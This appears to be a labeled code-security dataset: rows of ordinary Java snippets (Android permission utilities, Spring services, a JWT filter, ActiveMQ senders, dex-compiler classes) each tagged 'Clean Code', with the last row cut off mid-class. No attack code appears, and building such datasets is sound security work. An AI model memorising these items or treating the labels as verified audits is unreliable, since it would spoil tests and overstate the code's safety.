",0,Clean Code
"public class MeizuUtils {
  private static final String TAG=""MeizuUtils"";
  /** 
 * 检测 meizu 悬浮窗权限
 */
  public static boolean checkFloatWindowPermission(  Context context){
    final int version=Build.VERSION.SDK_INT;
    if (version >= 19) {
      return checkOp(context,24);
    }
    return true;
  }
  /** 
 * 去魅族权限申请页面
 */
  public static void applyPermission(  Context context){
    Intent intent=new Intent(""com.meizu.safe.security.SHOW_APPSEC"");
    intent.addCategory(Intent.CATEGORY_DEFAULT);
    intent.putExtra(""packageName"",context.getPackageName());
    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
    context.startActivity(intent);
  }
  @TargetApi(Build.VERSION_CODES.KITKAT) private static boolean checkOp(  Context context,  int op){
    final int version=Build.VERSION.SDK_INT;
    if (version >= 19) {
      AppOpsManager manager=(AppOpsManager)context.getSystemService(Context.APP_OPS_SERVICE);
      try {
        Class clazz=AppOpsManager.class;
        Method method=clazz.getDeclaredMethod(""checkOp"",int.class,int.class,String.class);
        return AppOpsManager.MODE_ALLOWED == (int)method.invoke(manager,op,Binder.getCallingUid(),context.getPackageName());
      }
 catch (      Exception e) {
        Log.e(TAG,Log.getStackTraceString(e));
      }
    }
 else {
      Log.e(TAG,""Below API 19 cannot invoke!"");
    }
    return false;
  }
}",0,Clean Code
"public class FragmentDoing extends LocalListFragment<FragmentBaseListBinding,AbstractTask> {
  @Override public BaseAdapter<?,? extends ViewDataBinding> adapter(){
    return new DoingAdapter(allItems,mContext);
  }
  @Override protected void initData(){
    super.initData();
    Worker.get().setFeedBack(new FeedBack(){
      @Override public void doSomething(){
        allItems.remove(0);
        mAdapter.notifyItemRemoved(0);
        mAdapter.notifyItemRangeChanged(0,allItems.size());
      }
    }
);
  }
  @Override public void onDestroyView(){
    Worker.get().setFeedBack(null);
    super.onDestroyView();
  }
  @Override public BaseRepo repository(){
    return new LocalRepo<List<AbstractTask>>(){
      @Override public List<AbstractTask> first(){
        return Worker.get().getRunningTask();
      }
      @Override public List<AbstractTask> next(){
        return null;
      }
    }
;
  }
  @Override public String getToolbarTitle(){
    return ""任务中心"";
  }
}
",0,Clean Code
"/** 
 * 商品收藏 Service 实现类
 * @author jason
 */
@Service @Validated public class ProductFavoriteServiceImpl implements ProductFavoriteService {
  @Resource private ProductFavoriteMapper productFavoriteMapper;
  @Override public Long createFavorite(  Long userId,  Long spuId){
    ProductFavoriteDO favorite=productFavoriteMapper.selectByUserIdAndSpuId(userId,spuId);
    if (favorite != null) {
      throw exception(FAVORITE_EXISTS);
    }
    ProductFavoriteDO entity=ProductFavoriteConvert.INSTANCE.convert(userId,spuId);
    productFavoriteMapper.insert(entity);
    return entity.getId();
  }
  @Override public void deleteFavorite(  Long userId,  Long spuId){
    ProductFavoriteDO favorite=productFavoriteMapper.selectByUserIdAndSpuId(userId,spuId);
    if (favorite == null) {
      throw exception(FAVORITE_NOT_EXISTS);
    }
    productFavoriteMapper.deleteById(favorite.getId());
  }
  @Override public PageResult<ProductFavoriteDO> getFavoritePage(  Long userId,  @Valid AppFavoritePageReqVO reqVO){
    return productFavoriteMapper.selectPageByUserAndType(userId,reqVO);
  }
  @Override public PageResult<ProductFavoriteDO> getFavoritePage(  @Valid ProductFavoritePageReqVO reqVO){
    return productFavoriteMapper.selectPageByUserId(reqVO);
  }
  @Override public ProductFavoriteDO getFavorite(  Long userId,  Long spuId){
    return productFavoriteMapper.selectByUserIdAndSpuId(userId,spuId);
  }
  @Override public Long getFavoriteCount(  Long userId){
    return productFavoriteMapper.selectCountByUserId(userId);
  }
}
",0,Clean Code
"public class VideoReplyQuoteView extends ImageReplyQuoteView {
  private TUIValueCallback downloadVideoSnapshotCallback;
  public VideoReplyQuoteView(  Context context){
    super(context);
  }
  @Override public void onDrawReplyQuote(  TUIReplyQuoteBean quoteBean){
    VideoMessageBean messageBean=(VideoMessageBean)quoteBean.getMessageBean();
    ViewGroup.LayoutParams layoutParams=getImageParams(imageMsgIv.getLayoutParams(),messageBean.getImgWidth(),messageBean.getImgHeight());
    imageMsgIv.setLayoutParams(layoutParams);
    videoPlayIv.setLayoutParams(layoutParams);
    videoPlayIv.setVisibility(View.VISIBLE);
    String snapshotPath=ChatFileDownloadPresenter.getVideoSnapshotPath(messageBean);
    if (FileUtil.isFileExists(snapshotPath)) {
      GlideEngine.loadCornerImageWithoutPlaceHolder(imageMsgIv,snapshotPath,null,DEFAULT_RADIUS);
    }
 else {
      GlideEngine.clear(imageMsgIv);
      downloadVideoSnapshotCallback=new TUIValueCallback(){
        @Override public void onProgress(        long currentSize,        long totalSize){
          TUIChatLog.i(""downloadSnapshot progress current:"",currentSize + "", total:"" + totalSize);
        }
        @Override public void onError(        int code,        String desc){
          TUIChatLog.e(""MessageAdapter video getImage"",code + "":"" + desc);
        }
        @Override public void onSuccess(        Object obj){
          GlideEngine.loadCornerImageWithoutPlaceHolder(imageMsgIv,snapshotPath,null,DEFAULT_RADIUS);
        }
      }
;
      ChatFileDownloadPresenter.downloadVideoSnapshot(messageBean,downloadVideoSnapshotCallback);
    }
  }
}
",0,Clean Code
"/** 
 * @author wangchao
 * @date 2019/08/25
 */
public class WordMapAddView extends DialogWrapper {
  private JPanel panel;
  private JTextField sourceTextField;
  private JTextField targetTextField;
  private JLabel source;
  private JLabel target;
  public WordMapAddView(){
    super(false);
    init();
    setTitle(""添加单词映射"");
  }
  @Nullable @Override protected JComponent createCenterPanel(){
    return panel;
  }
  @Nullable @Override protected ValidationInfo doValidate(){
    if (sourceTextField.getText() == null || sourceTextField.getText().length() <= 0) {
      return new ValidationInfo(""请输入原单词"",sourceTextField);
    }
    if (targetTextField.getText() == null || targetTextField.getText().length() <= 0) {
      return new ValidationInfo(""请输入转换后的单词"",targetTextField);
    }
    return super.doValidate();
  }
  public Map.Entry<String,String> getMapping(){
    return new SimpleEntry<>(sourceTextField.getText().toLowerCase(),targetTextField.getText());
  }
}",0,Clean Code
"/** 
 * Created by qiaoruikai on 2019-05-07 17:04.
 */
public class RectUtil {
  /** 
 * 安全扩展区域
 * @param origin
 * @param pixel
 * @param maxWidth
 * @param maxHeight
 * @return
 */
  public static Rect safetyExpend(  @NonNull Rect origin,  int pixel,  int maxWidth,  int maxHeight){
    return ensureBound(new Rect(origin.left - pixel,origin.top - pixel,origin.right + pixel,origin.bottom + pixel),maxWidth,maxHeight);
  }
  /** 
 * 安全扩展区域
 * @param origin
 * @param pixel
 * @param maxWidth
 * @param maxHeight
 * @return
 */
  public static RectF safetyExpend(  @NonNull RectF origin,  float pixel,  int maxWidth,  int maxHeight){
    return ensureBound(new RectF(origin.left - pixel,origin.top - pixel,origin.right + pixel,origin.bottom + pixel),maxWidth,maxHeight);
  }
  /** 
 * 安全缩放
 * @param origin
 * @param scale
 * @param maxWidth
 * @param maxHeight
 * @return
 */
  public static Rect safetyScale(  @NonNull Rect origin,  float scale,  int maxWidth,  int maxHeight){
    return ensureBound(scaleRect(origin,scale),maxWidth,maxHeight);
  }
  /** 
 * 安全缩放
 * @param origin
 * @param scale
 * @param maxWidth
 * @param maxHeight
 * @return
 */
  public static RectF safetyScale(  @NonNull RectF origin,  float scale,  float maxWidth,  float maxHeight){
    return ensureBound(scaleRectF(origin,scale),maxWidth,maxHeight);
  }
  /** 
 * 缩放Rect
 * @param origin
 * @param scale
 * @return
 */
  public static Rect scaleRect(  @NonNull Rect origin,  float scale){
    if (scale != 1) {
      return new Rect((int)(origin.left * scale + 0.5f),(int)(origin.top * scale + 0.5f),(int)(origin.right * scale + 0.5f),(int)(origin.bottom * scale + 0.5f));
    }
 else {
      return new Rect(origin);
    }
  }
  /** 
 * 缩放Rect
 * @param origin
 * @param scale
 * @return
 */
  public static RectF scaleRectF(  @NonNull RectF origin,  float scale){
    if (scale != 1) {
      return new RectF(origin.left * scale,origin.top * scale,origin.right * scale,origin.bottom * scale);
    }
 else {
      return new RectF(origin);
    }
  }
  /** 
 * 确保边界
 * @param target
 * @param maxWidth
 * @param maxHeight
 * @return
 */
  public static Rect ensureBound(  @NonNull Rect target,  int maxWidth,  int maxHeight){
    return new Rect(Math.max(target.left,0),Math.max(target.top,0),Math.min(target.right,maxWidth),Math.min(target.bottom,maxHeight));
  }
  /** 
 * 确保边界
 * @param target
 * @param maxWidth
 * @param maxHeight
 * @return
 */
  public static RectF ensureBound(  @NonNull RectF target,  float maxWidth,  float maxHeight){
    return new RectF(Math.max(target.left,0),Math.max(target.top,0),Math.min(target.right,maxWidth),Math.min(target.bottom,maxHeight));
  }
}",0,Clean Code
"/** 
 * Instruction which contains switch cases.
 */
public final class SwitchInsn extends Insn {
  /** 
 * {@code non-null;} list of switch cases 
 */
  private final IntList cases;
  /** 
 * Constructs an instance.
 * @param opcode {@code non-null;} the opcode
 * @param position {@code non-null;} source position
 * @param result {@code null-ok;} spec for the result, if any
 * @param sources {@code non-null;} specs for all the sources
 * @param cases {@code non-null;} list of switch cases
 */
  public SwitchInsn(  Rop opcode,  SourcePosition position,  RegisterSpec result,  RegisterSpecList sources,  IntList cases){
    super(opcode,position,result,sources);
    if (opcode.getBranchingness() != Rop.BRANCH_SWITCH) {
      throw new IllegalArgumentException(""bogus branchingness"");
    }
    if (cases == null) {
      throw new NullPointerException(""cases == null"");
    }
    this.cases=cases;
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public String getInlineString(){
    return cases.toString();
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public TypeList getCatches(){
    return StdTypeList.EMPTY;
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public void accept(  Visitor visitor){
    visitor.visitSwitchInsn(this);
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public Insn withAddedCatch(  Type type){
    throw new UnsupportedOperationException(""unsupported"");
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public Insn withRegisterOffset(  int delta){
    return new SwitchInsn(getOpcode(),getPosition(),getResult().withOffset(delta),getSources().withOffset(delta),cases);
  }
  /** 
 * {@inheritDoc}<p> SwitchInsn always compares false. The current use for this method never encounters  {@code SwitchInsn}s
 */
  @Override public boolean contentEquals(  Insn b){
    return false;
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public Insn withNewRegisters(  RegisterSpec result,  RegisterSpecList sources){
    return new SwitchInsn(getOpcode(),getPosition(),result,sources,cases);
  }
  /** 
 * Gets the list of switch cases.
 * @return {@code non-null;} the case list
 */
  public IntList getCases(){
    return cases;
  }
}
",0,Clean Code
"/** 
 * List of  {@link Constant} instances.
 */
public static final class List extends FixedSizeList implements Comparable<List> {
  /** 
 * Constructs an instance. All indices initially contain {@code null}.
 * @param size the size of the list
 */
  public List(  int size){
    super(size);
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public int compareTo(  List other){
    int thisSize=size();
    int otherSize=other.size();
    int compareSize=(thisSize < otherSize) ? thisSize : otherSize;
    for (int i=0; i < compareSize; i++) {
      Constant thisItem=(Constant)get0(i);
      Constant otherItem=(Constant)other.get0(i);
      int compare=thisItem.compareTo(otherItem);
      if (compare != 0) {
        return compare;
      }
    }
    if (thisSize < otherSize) {
      return -1;
    }
 else     if (thisSize > otherSize) {
      return 1;
    }
    return 0;
  }
  /** 
 * Gets the element at the given index. It is an error to call this with the index for an element which was never set; if you do that, this will throw  {@code NullPointerException}.
 * @param n {@code >= 0, < size();} which index
 * @return {@code non-null;} element at that index
 */
  public Constant get(  int n){
    return (Constant)get0(n);
  }
  /** 
 * Sets the element at the given index.
 * @param n {@code >= 0, < size();} which index
 * @param a {@code null-ok;} the element to set at {@code n}
 */
  public void set(  int n,  Constant a){
    set0(n,a);
  }
}
",0,Clean Code
"@Singleton @JdbcRunnerEnabled public class JdbcSchedulerTriggerState implements SchedulerTriggerStateInterface {
  protected AbstractJdbcTriggerRepository triggerRepository;
  public JdbcSchedulerTriggerState(  AbstractJdbcTriggerRepository triggerRepository){
    this.triggerRepository=triggerRepository;
  }
  @PostConstruct public void initTriggerEvaluateRunning(){
    this.triggerRepository.findAllForAllTenants().forEach(trigger -> {
      if (trigger.getEvaluateRunningDate() != null) {
        var unlocked=trigger.toBuilder().evaluateRunningDate(null).build();
        this.triggerRepository.save(unlocked);
      }
    }
);
  }
  @Override public Optional<Trigger> findLast(  TriggerContext context){
    return this.triggerRepository.findLast(context);
  }
  @Override public List<Trigger> findAllForAllTenants(){
    return this.triggerRepository.findAllForAllTenants();
  }
  @Override public Trigger save(  Trigger trigger,  ScheduleContextInterface scheduleContextInterface){
    this.triggerRepository.save(trigger,scheduleContextInterface);
    return trigger;
  }
  @Override public Trigger create(  Trigger trigger){
    return this.triggerRepository.create(trigger);
  }
  @Override public Trigger update(  Trigger trigger){
    Optional<Trigger> existing=findLast(trigger);
    Trigger updated=trigger;
    if (existing.isPresent() && existing.get().getDisabled()) {
      updated=trigger.toBuilder().disabled(true).build();
    }
    return this.triggerRepository.update(updated);
  }
  public Trigger update(  Flow flow,  AbstractTrigger abstractTrigger,  ConditionContext conditionContext){
    return this.triggerRepository.update(flow,abstractTrigger,conditionContext);
  }
  public void delete(  Trigger trigger) throws QueueException {
    this.triggerRepository.delete(trigger);
  }
  @Override public List<Trigger> findByNextExecutionDateReadyForAllTenants(  ZonedDateTime now,  ScheduleContextInterface scheduleContext){
    return this.triggerRepository.findByNextExecutionDateReadyForAllTenants(now,scheduleContext);
  }
  @Override public List<Trigger> findByNextExecutionDateReadyForGivenFlows(  List<FlowWithSource> flows,  ZonedDateTime now,  ScheduleContextInterface scheduleContext){
    throw new NotImplementedException();
  }
}
",0,Clean Code
"/** 
 * 消息发送
 * @author 一明哥
 */
public class SenderTopic {
  public static void main(  String[] args) throws Exception {
    ActiveMQConnectionFactory connectionFactory=new ActiveMQConnectionFactory(""admin"",""admin"",""tcp://localhost:5671"");
    Connection connection=connectionFactory.createConnection();
    Session session=connection.createSession(false,Session.AUTO_ACKNOWLEDGE);
    Destination topic=session.createTopic(""tpk"");
    MessageProducer producer=session.createProducer(topic);
    for (int i=0; i < 100; i++) {
      TextMessage textMessage=session.createTextMessage(""hi: "");
      producer.send(textMessage);
    }
    connection.close();
    System.out.println(""System exit...."");
  }
}
/** 
 * 消息发送
 * @author 一明哥
 */
public class SenderTopic {
  public static void main(  String[] args) throws Exception {
    ActiveMQConnectionFactory connectionFactory=new ActiveMQConnectionFactory(""admin"",""admin"",""tcp://localhost:61616"");
    Connection connection=connectionFactory.createConnection();
    Session session=connection.createSession(false,Session.AUTO_ACKNOWLEDGE);
    Destination topic=session.createTopic(""user"");
    MessageProducer producer=session.createProducer(topic);
    producer.setDeliveryMode(DeliveryMode.NON_PERSISTENT);
    TextMessage textMessage=session.createTextMessage(""hi: "");
    long delay=10 * 1000;
    int repeat=9;
    long period=2 * 1000;
    textMessage.setLongProperty(ScheduledMessage.AMQ_SCHEDULED_DELAY,delay);
    textMessage.setIntProperty(ScheduledMessage.AMQ_SCHEDULED_REPEAT,repeat);
    textMessage.setLongProperty(ScheduledMessage.AMQ_SCHEDULED_PERIOD,period);
    producer.send(textMessage);
    connection.close();
    System.out.println(""System exit...."");
  }
}
",0,Clean Code
"/** 
 * 安全工具类
 * @author L.cm
 */
@UtilityClass public class SecurityUtils {
  /** 
 * 获取Authentication
 */
  public Authentication getAuthentication(){
    return SecurityContextHolder.getContext().getAuthentication();
  }
  /** 
 * 获取用户
 */
  public PigUser getUser(  Authentication authentication){
    Object principal=authentication.getPrincipal();
    if (principal instanceof PigUser) {
      return (PigUser)principal;
    }
    return null;
  }
  /** 
 * 获取用户
 */
  public PigUser getUser(){
    Authentication authentication=getAuthentication();
    if (authentication == null) {
      return null;
    }
    return getUser(authentication);
  }
  /** 
 * 获取用户角色信息
 * @return 角色集合
 */
  public List<Long> getRoles(){
    Authentication authentication=getAuthentication();
    Collection<? extends GrantedAuthority> authorities=authentication.getAuthorities();
    List<Long> roleIds=new ArrayList<>();
    authorities.stream().filter(granted -> StrUtil.startWith(granted.getAuthority(),SecurityConstants.ROLE)).forEach(granted -> {
      String id=StrUtil.removePrefix(granted.getAuthority(),SecurityConstants.ROLE);
      roleIds.add(Long.parseLong(id));
    }
);
    return roleIds;
  }
}
",0,Clean Code
"/** 
 * A class for keeping track of the cache key of the original data + any requested signature.
 */
public class OriginalKey implements Key {
  private final String id;
  private final Key signature;
  public OriginalKey(  String id,  Key signature){
    this.id=id;
    this.signature=signature;
  }
  @Override public boolean equals(  Object o){
    if (this == o) {
      return true;
    }
    if (o == null || getClass() != o.getClass()) {
      return false;
    }
    OriginalKey that=(OriginalKey)o;
    if (!id.equals(that.id)) {
      return false;
    }
    if (!signature.equals(that.signature)) {
      return false;
    }
    return true;
  }
  @Override public int hashCode(){
    int result=id.hashCode();
    result=31 * result + signature.hashCode();
    return result;
  }
  @Override public void updateDiskCacheKey(  MessageDigest messageDigest) throws UnsupportedEncodingException {
    messageDigest.update(id.getBytes(STRING_CHARSET_NAME));
    signature.updateDiskCacheKey(messageDigest);
  }
}
",0,Clean Code
"/** 
 * @author : zlt
 * @date : 2023/11/14 <p> Blog: https://zlt2000.gitee.io Github: https://github.com/zlt2000
 */
public class OAuthEndpointUtils {
  public static final String ACCESS_TOKEN_REQUEST_ERROR_URI=""https://datatracker.ietf.org/doc/html/rfc6749#section-5.2"";
  private OAuthEndpointUtils(){
  }
  public static MultiValueMap<String,String> getParameters(  HttpServletRequest request){
    Map<String,String[]> parameterMap=request.getParameterMap();
    MultiValueMap<String,String> parameters=new LinkedMultiValueMap<>(parameterMap.size());
    parameterMap.forEach((key,values) -> {
      if (values.length > 0) {
        for (        String value : values) {
          parameters.add(key,value);
        }
      }
    }
);
    return parameters;
  }
  public static String getParam(  MultiValueMap<String,String> parameters,  String paramName){
    String paramValue=parameters.getFirst(paramName);
    if (!StringUtils.hasText(paramValue) || parameters.get(paramName).size() != 1) {
      OAuthEndpointUtils.throwError(OAuth2ErrorCodes.INVALID_REQUEST,paramName,OAuthEndpointUtils.ACCESS_TOKEN_REQUEST_ERROR_URI);
    }
    return paramValue;
  }
  public static Map<String,Object> getParametersIfMatchesAuthorizationCodeGrantRequest(  HttpServletRequest request,  String... exclusions){
    if (!matchesAuthorizationCodeGrantRequest(request)) {
      return Collections.emptyMap();
    }
    MultiValueMap<String,String> multiValueParameters=getParameters(request);
    for (    String exclusion : exclusions) {
      multiValueParameters.remove(exclusion);
    }
    Map<String,Object> parameters=new HashMap<>();
    multiValueParameters.forEach((key,value) -> parameters.put(key,(value.size() == 1) ? value.get(0) : value.toArray(new String[0])));
    return parameters;
  }
  public static boolean matchesAuthorizationCodeGrantRequest(  HttpServletRequest request){
    return AuthorizationGrantType.AUTHORIZATION_CODE.getValue().equals(request.getParameter(OAuth2ParameterNames.GRANT_TYPE)) && request.getParameter(OAuth2ParameterNames.CODE) != null;
  }
  public static boolean matchesPkceTokenRequest(  HttpServletRequest request){
    return matchesAuthorizationCodeGrantRequest(request) && request.getParameter(PkceParameterNames.CODE_VERIFIER) != null;
  }
  public static void throwError(  String errorCode,  String parameterName,  String errorUri){
    OAuth2Error error=new OAuth2Error(errorCode,""OAuth 2.0 Parameter: "" + parameterName,errorUri);
    throw new OAuth2AuthenticationException(error);
  }
  public static String normalizeUserCode(  String userCode){
    Assert.hasText(userCode,""userCode cannot be empty"");
    StringBuilder sb=new StringBuilder(userCode.toUpperCase().replaceAll(""[^A-Z\\d]+"",""""));
    Assert.isTrue(sb.length() == 8,""userCode must be exactly 8 alpha/numeric characters"");
    sb.insert(4,'-');
    return sb.toString();
  }
}
",0,Clean Code
"@Route(APIPath.User_Get_Info) @HttpMethod(""POST"") public class GetUserAction extends AdminAction {
  @Override public boolean isTransactionAction(){
    return true;
  }
  @Override public boolean action(  Request request,  Response response){
    if (request.getNettyRequest() instanceof FullHttpRequest) {
      InputGetUserInfo inputUserId=getRequestBody(request.getNettyRequest(),InputGetUserInfo.class);
      if (inputUserId != null && (!StringUtil.isNullOrEmpty(inputUserId.getUserId()) || !StringUtil.isNullOrEmpty(inputUserId.getName()) || !StringUtil.isNullOrEmpty(inputUserId.getMobile()))) {
        WFCMessage.User user=null;
        if (!StringUtil.isNullOrEmpty(inputUserId.getUserId())) {
          user=messagesStore.getUserInfo(inputUserId.getUserId());
        }
 else         if (!StringUtil.isNullOrEmpty(inputUserId.getName())) {
          user=messagesStore.getUserInfoByName(inputUserId.getName());
        }
 else         if (!StringUtil.isNullOrEmpty(inputUserId.getMobile())) {
          user=messagesStore.getUserInfoByMobile(inputUserId.getMobile());
        }
        RestResult result;
        if (user == null || user.getDeleted() > 0) {
          result=RestResult.resultOf(ErrorCode.ERROR_CODE_NOT_EXIST);
        }
 else {
          result=RestResult.ok(InputOutputUserInfo.fromPbUser(user));
        }
        setResponseContent(result,response);
      }
 else {
        setResponseContent(RestResult.resultOf(ErrorCode.INVALID_PARAMETER),response);
      }
    }
    return true;
  }
}
",0,Clean Code
"/** 
 * 积分商城商品 Mapper
 * @author HUIHUI
 */
@Mapper public interface PointProductMapper extends BaseMapperX<PointProductDO> {
  default List<PointProductDO> selectListByActivityId(  Collection<Long> activityIds){
    return selectList(PointProductDO::getActivityId,activityIds);
  }
  default List<PointProductDO> selectListByActivityId(  Long activityId){
    return selectList(PointProductDO::getActivityId,activityId);
  }
  default void updateByActivityId(  PointProductDO pointProductDO){
    update(pointProductDO,new LambdaUpdateWrapper<PointProductDO>().eq(PointProductDO::getActivityId,pointProductDO.getActivityId()));
  }
  default PointProductDO selectListByActivityIdAndSkuId(  Long activityId,  Long skuId){
    return selectOne(PointProductDO::getActivityId,activityId,PointProductDO::getSkuId,skuId);
  }
  /** 
 * 更新活动库存（减少）
 * @param id    活动编号
 * @param count 扣减的库存数量(减少库存)
 * @return 影响的行数
 */
  default int updateStockDecr(  Long id,  int count){
    Assert.isTrue(count > 0);
    return update(null,new LambdaUpdateWrapper<PointProductDO>().eq(PointProductDO::getId,id).ge(PointProductDO::getStock,count).setSql(""stock = stock - "" + count));
  }
  /** 
 * 更新活动库存（增加）
 * @param id    活动编号
 * @param count 需要增加的库存（增加库存）
 * @return 影响的行数
 */
  default int updateStockIncr(  Long id,  int count){
    Assert.isTrue(count > 0);
    return update(null,new LambdaUpdateWrapper<PointProductDO>().eq(PointProductDO::getId,id).setSql(""stock = stock + "" + count));
  }
}
",0,Clean Code
"@Controller public class MainController {
  @GetMapping(""/login.html"") public String login(){
    return ""login"";
  }
  @GetMapping(""/ok"") public String ok(){
    return ""ok"";
  }
}
@Controller public class MainController {
  @GetMapping public String list(){
    return ""list"";
  }
}
@Controller public class MainController {
  @GetMapping(""/login.html"") public String login(){
    return ""login"";
  }
  @GetMapping(""/ok"") public String ok(){
    return ""ok"";
  }
}
@Controller public class MainController {
  @GetMapping(""/login.html"") public String login(){
    return ""login"";
  }
  @GetMapping(""/ok"") public String ok(){
    return ""ok"";
  }
  @Autowired Producer captchaProducer;
  @GetMapping(""/kaptcha"") public void getKaptchaImage(  HttpServletRequest request,  HttpServletResponse response) throws Exception {
    HttpSession session=request.getSession();
    response.setDateHeader(""Expires"",0);
    response.setHeader(""Cache-Control"",""no-store, no-cache, must-revalidate"");
    response.addHeader(""Cache-Control"",""post-check=0, pre-check=0"");
    response.setHeader(""Pragma"",""no-cache"");
    response.setContentType(""image/jpeg"");
    String capText=captchaProducer.createText();
    session.setAttribute(Constants.KAPTCHA_SESSION_KEY,capText);
    BufferedImage bi=captchaProducer.createImage(capText);
    ServletOutputStream out=response.getOutputStream();
    ImageIO.write(bi,""jpg"",out);
    try {
      out.flush();
    }
  finally {
      out.close();
    }
  }
}
",0,Clean Code
"/** 
 * Association of a field and its annotations. 
 */
public final class FieldAnnotationStruct implements ToHuman, Comparable<FieldAnnotationStruct> {
  /** 
 * {@code non-null;} the field in question 
 */
  private final CstFieldRef field;
  /** 
 * {@code non-null;} the associated annotations 
 */
  private AnnotationSetItem annotations;
  /** 
 * Constructs an instance.
 * @param field {@code non-null;} the field in question
 * @param annotations {@code non-null;} the associated annotations
 */
  public FieldAnnotationStruct(  CstFieldRef field,  AnnotationSetItem annotations){
    if (field == null) {
      throw new NullPointerException(""field == null"");
    }
    if (annotations == null) {
      throw new NullPointerException(""annotations == null"");
    }
    this.field=field;
    this.annotations=annotations;
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public int hashCode(){
    return field.hashCode();
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public boolean equals(  Object other){
    if (!(other instanceof FieldAnnotationStruct)) {
      return false;
    }
    return field.equals(((FieldAnnotationStruct)other).field);
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public int compareTo(  FieldAnnotationStruct other){
    return field.compareTo(other.field);
  }
  /** 
 * {@inheritDoc} 
 */
  public void addContents(  DexFile file){
    FieldIdsSection fieldIds=file.getFieldIds();
    MixedItemSection wordData=file.getWordData();
    fieldIds.intern(field);
    annotations=wordData.intern(annotations);
  }
  /** 
 * {@inheritDoc} 
 */
  public void writeTo(  DexFile file,  AnnotatedOutput out){
    int fieldIdx=file.getFieldIds().indexOf(field);
    int annotationsOff=annotations.getAbsoluteOffset();
    if (out.annotates()) {
      out.annotate(0,""    "" + field.toHuman());
      out.annotate(4,""      field_idx:       "" + Hex.u4(fieldIdx));
      out.annotate(4,""      annotations_off: "" + Hex.u4(annotationsOff));
    }
    out.writeInt(fieldIdx);
    out.writeInt(annotationsOff);
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public String toHuman(){
    return field.toHuman() + "": "" + annotations;
  }
  /** 
 * Gets the field this item is for.
 * @return {@code non-null;} the field
 */
  public CstFieldRef getField(){
    return field;
  }
  /** 
 * Gets the associated annotations.
 * @return {@code non-null;} the annotations
 */
  public Annotations getAnnotations(){
    return annotations.getAnnotations();
  }
}
",0,Clean Code
"public class DoubleArray extends BaseArray<double[]> implements PrimitiveArray<double[]> {
  public DoubleArray(  VM vm,  double[] value){
    super(vm.resolveClass(""[D""),value);
  }
  @Override public int length(){
    return value.length;
  }
  public void setValue(  double[] value){
    super.value=value;
  }
  @Override public void setData(  int start,  double[] data){
    System.arraycopy(data,0,value,start,data.length);
  }
  @Override public UnidbgPointer _GetArrayCritical(  Emulator<?> emulator,  Pointer isCopy){
    if (isCopy != null) {
      isCopy.setInt(0,VM.JNI_TRUE);
    }
    UnidbgPointer pointer=this.allocateMemoryBlock(emulator,value.length * 8);
    pointer.write(0,value,0,value.length);
    return pointer;
  }
  @Override public void _ReleaseArrayCritical(  Pointer elems,  int mode){
switch (mode) {
case VM.JNI_COMMIT:
      this.setValue(elems.getDoubleArray(0,this.value.length));
    break;
case 0:
  this.setValue(elems.getDoubleArray(0,this.value.length));
case VM.JNI_ABORT:
this.freeMemoryBlock(elems);
break;
}
}
}
",0,Clean Code
"public class JWTAuthorizationFilter extends BasicAuthenticationFilter {
  public JWTAuthorizationFilter(  AuthenticationManager authenticationManager){
    super(authenticationManager);
  }
  @Override protected void doFilterInternal(  HttpServletRequest request,  HttpServletResponse response,  FilterChain chain) throws IOException, ServletException {
    String tokenHeader=request.getHeader(JwtTokenUtils.TOKEN_HEADER);
    if (tokenHeader == null || !tokenHeader.startsWith(JwtTokenUtils.TOKEN_PREFIX)) {
      chain.doFilter(request,response);
      return;
    }
    try {
      SecurityContextHolder.getContext().setAuthentication(getAuthentication(tokenHeader));
    }
 catch (    TokenIsExpiredException e) {
      response.setCharacterEncoding(""UTF-8"");
      response.setContentType(""application/json; charset=utf-8"");
      response.getWriter().write(JSON.toJSONString(R.failed(e.getMessage())));
      response.getWriter().flush();
      return;
    }
    super.doFilterInternal(request,response,chain);
  }
  private UsernamePasswordAuthenticationToken getAuthentication(  String tokenHeader) throws TokenIsExpiredException {
    String token=tokenHeader.replace(JwtTokenUtils.TOKEN_PREFIX,"""");
    boolean expiration=JwtTokenUtils.isExpiration(token);
    if (expiration) {
      throw new TokenIsExpiredException(""登录时间过长，请退出重新登录"");
    }
 else {
      String username=JwtTokenUtils.getUsername(token);
      String role=JwtTokenUtils.getUserRole(token);
      if (username != null) {
        return new UsernamePasswordAuthenticationToken(username,null,Collections.singleton(new SimpleGrantedAuthority(role)));
      }
    }
    return null;
  }
}",0,Clean Code
"public class ClipboardManagerProxyProvider {
  public static ClipboardManager provide(  Context context){
    try {
      return new ClipboardManagerProxy(context);
    }
 catch (    Throwable e) {
      XLog.d(""Fail provide ClipboardManager"",e);
      throw new IllegalStateException(""Fail provide ClipboardManager"",e);
    }
  }
@SuppressWarnings(""rawtypes"") private static class ClipboardManagerProxy extends ClipboardManager {
    private final Context context;
    private final ClipboardManager stockManager;
    public ClipboardManagerProxy(    Context context) throws ServiceManager.ServiceNotFoundException {
      super(context,new Handler(Looper.getMainLooper()));
      this.context=context;
      this.stockManager=new ClipboardManager(context,new Handler(Looper.getMainLooper()));
    }
    @Override public ClipData getPrimaryClip(){
      XLog.d(""ClipboardManagerProxy getPrimaryClip"");
      ThanosManager.from(context).ifServiceInstalled(new Consumer<ThanosManager>(){
        @Override public void accept(        ThanosManager thanosManager){
          thanosManager.getAppOpsManager().onStartOp(new Binder(),AppOpsManager.OP_READ_CLIPBOARD,Binder.getCallingUid(),context.getPackageName());
        }
      }
);
      return super.getPrimaryClip();
    }
    @Override public void setPrimaryClip(    ClipData clip){
      XLog.d(""ClipboardManagerProxy setPrimaryClip"");
      ThanosManager.from(context).ifServiceInstalled(thanosManager -> {
        thanosManager.getAppOpsManager().onStartOp(new Binder(),AppOpsManager.OP_WRITE_CLIPBOARD,Binder.getCallingUid(),context.getPackageName());
        thanosManager.getNotificationManager().onSetPrimaryClip(clip,Pkg.currentUserPkg(context.getPackageName()));
      }
);
      super.setPrimaryClip(clip);
    }
    public ClipData getUserPrimaryClip(){
      return (ClipData)XposedHelpers.callMethod(stockManager,""getUserPrimaryClip"");
